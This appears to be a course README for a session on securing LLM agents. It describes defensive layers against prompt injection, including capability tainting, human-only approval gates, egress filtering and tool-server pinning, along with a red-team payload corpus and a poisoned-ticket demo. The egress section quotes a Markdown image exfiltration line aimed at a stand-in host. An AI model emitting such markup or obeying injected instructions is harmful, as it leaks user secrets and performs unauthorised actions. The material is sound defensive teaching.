# S8 · Securing agents

Part of [Week 4 · Agent Architecture and Security](..). The session slides are at
[hub.gazar.dev/llms-and-agents/s08-securing-agents](https://hub.gazar.dev/llms-and-agents/s08-securing-agents/);
this folder is the runnable version of every defence on them.

The assumption this folder is built on, and it is not pessimism, it is the
design: **the model falls for the injection.** Every test here uses a policy
that does exactly what the attacker asked. Nothing passes because the model was
clever. Everything passes because the layers do not depend on it being clever.

```bash
npm test                                                  # all of it, offline
npx vitest run weeks/week-4-agent-architecture-security    # just this week
npm run lab weeks/week-4-agent-architecture-security/s08-securing-agents/threat-model.ts
```

## What is in here

Five folders, one per layer, plus the suite that proves they hold.

### `boundary/` · the trust boundary, made into a type

| File | What it gives you |
|---|---|
| [`untrusted.ts`](boundary/untrusted.ts) | `Untrusted<T>`, a branded type you cannot pass where a trusted string is expected; `scrubInvisible` for zero-width and Unicode-tag payloads; `fence` with a per-request nonce so a document cannot close the fence and start giving orders |

Read the comment at the bottom of that file before you trust any of it. Fencing
lowers an attack's success rate. It does not make you safe, and there is a test
named for exactly that, *"does NOT filter a plausible-sounding instruction, and
that is deliberate"*.

### `privilege/` · least privilege as something the run carries

| File | What it gives you |
|---|---|
| [`capability.ts`](privilege/capability.ts) | `grant` from the **user's** permissions rather than the service account, scoped capabilities, `narrow` with no `widen`, `taint` which drops every acting capability the moment untrusted content arrives, and `lethalTrifecta` |

`taint` is the highest-value function in this folder. After it runs, a
successful injection can still make the model say something wrong. It can no
longer make it do something wrong.

The scope check is the quiet one: the payload says refund `o-9999`, the
capability says `o-1001`, and the denial is arithmetic rather than judgement.

### `approval/` · the gate, and the four ways people build it wrong

| File | What it gives you |
|---|---|
| [`gate.ts`](approval/gate.ts) | approval bound to the exact arguments, single use, expiring, grantable **only** by a human actor, and `renderForHuman` which builds the confirm prompt from validated arguments so an attacker cannot ghost-write the dialog |

Every one of those four is a test. The one to read is *"refuses an approval from
the model, which is the entire attack"*.

### `egress/` · the way the data actually leaves

| File | What it gives you |
|---|---|
| [`outbound.ts`](egress/outbound.ts) | `checkUrl` (scheme, credentials-in-URL, internal addresses, then an exact-match allow-list), `scrubOutbound` for Markdown image and link exfiltration, `redactSecrets`, and `guardOutbound` which does them in the order that matters |

The attack this exists for needs no tool call and no click: `![](https://evil.example/p?d=SECRET)`
renders, and rendering is a request.

### `supply-chain/` · the tools you did not write

| File | What it gives you |
|---|---|
| [`servers.ts`](supply-chain/servers.ts) | `pin` a fingerprint of what you reviewed, `admit` which blocks unpinned servers and catches a rug pull, `suspiciousText` to point a human at a description that is really an instruction, and `detectShadowing` for one server rewriting how another's tool is used |

A tool description is prompt text written by someone else. These are the same
boring controls you already use for npm, which is the lesson.

### `redteam/` · so "we tested it" means something

| File | What it gives you |
|---|---|
| [`corpus.ts`](redteam/corpus.ts) | nine payloads across six categories, each naming its goal and the layer that should stop it |

[`corpus.test.ts`](redteam/corpus.test.ts) runs every payload through the real
hardened path and asserts three things: no money moved, nothing left for a host
you did not allow, and the refusal was **recorded** rather than silently working
out fine. When you find a new payload in the wild, add it here. The corpus only
grows.

### `real-world/` · the whole thing, attacked

[S7's support agent, with a poisoned ticket note](real-world/README.md). Every
layer can be switched off individually, so you can watch the attack succeed
before you claim the defence works.

### `threat-model.ts` · your own system, printed

Edit the `SYSTEM` object and run it. It prints your untrusted entry points, each
tool's worst case and which layers cover it, your lethal-trifecta verdict, live
egress decisions, the supply-chain result, red-team coverage, and the residual
risk you are naming. That is most of Project 3.

## Where this goes next

[Lab 4 · Guardrailed Agent](../lab-guardrailed-agent) has you build this into
your own agent, including the part where you disable the allow-list and watch
the poisoned tool land. [Week 5](../../week-5-evals-observability) turns the
red-team corpus into a scored eval that runs against a real model.
